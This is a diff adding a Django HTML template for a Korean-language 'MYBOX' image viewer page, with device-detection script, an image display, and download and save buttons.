@@ -1,0 +1,66 @@
+{% load static %}
+<!DOCTYPE html>
+<html class="{{ html_class }}" lang="ko">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2.0,minimum-scale=1,viewport-fit=cover">
+    <title>{{ page_title }}</title>
+    <link rel="shortcut icon" href="https://mail.naver.com/favicon.ico" type="image/x-icon">
+    <script>
+        (function () {
+            var ua = navigator.userAgent || '';
+            var width = window.innerWidth || document.documentElement.clientWidth || 0;
+            var mobileUa = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini|Mobile/i.test(ua)
+                || (navigator.maxTouchPoints > 1 && /Macintosh/i.test(ua));
+            var html = document.documentElement;
+            if (mobileUa || width < 1024) {
+                html.className = /iPhone|iPad|iPod/i.test(ua) ? 'ios' : 'aos';
+            } else {
+                html.className = /Mac OS X|Macintosh/i.test(ua) ? 'pc mac' : 'pc win';
+            }
+        })();
+    </script>
+    <link rel="stylesheet" href="{% static 'mybox/css/viewer.css' %}?v=5">
+</head>
+<body{% if embed %} data-embed="1"{% endif %}>
+<div class="viewer_wrap">
+    <div class="viewer">
+        <div class="viewer_header">
+            <div class="button_wrap">
+                <button type="button" class="button_close" id="button_viewer_close"{% if embed %} hidden{% endif %} data-fallback-url="{{ mybox_redirect_url }}">
+                    <span class="blind">이미지 뷰어 닫기</span>
+                </button>
+            </div>
+            <div class="file_title_wrap">
+                <strong class="file_title">
+                    <span class="blind">파일명</span>
+                    <span class="text">{{ filename }}</span>
+                    <span class="file_extension">{{ extension }}</span>
+                </strong>
+                <span class="file_volume">{{ filesize }}</span>
+            </div>
+        </div>
+        <div class="viewer_index" aria-hidden="true"><strong>{{ current }}</strong>/{{ total }}</div>
+        <div class="viewer_contents">
+            <ol class="image_list">
+                <li class="image_item">
+                    <img src="{{ image_url }}" alt="{{ filename }}{{ extension }}">
+                </li>
+            </ol>
+            <button type="button" class="button_previous" disabled>
+                <span class="blind">이전 사진 보기</span>
+            </button>
+            <button type="button" class="button_next" disabled>
+                <span class="blind">다음 사진 보기</span>
+            </button>
+        </div>
+        <div class="viewer_task">
+            <a class="button_svg_download" href="{{ image_url }}" download="{{ filename }}{{ extension }}">다운로드</a>
+            <button type="button" class="button_svg_mybox" id="button_mybox_save">MYBOX 저장</button>
+        </div>
+    </div>
+</div>
+<div id="toast" class="toast" hidden></div>
+<script src="{% static 'mybox/js/viewer.js' %}?v=7"></script>
+</body>
+</html>
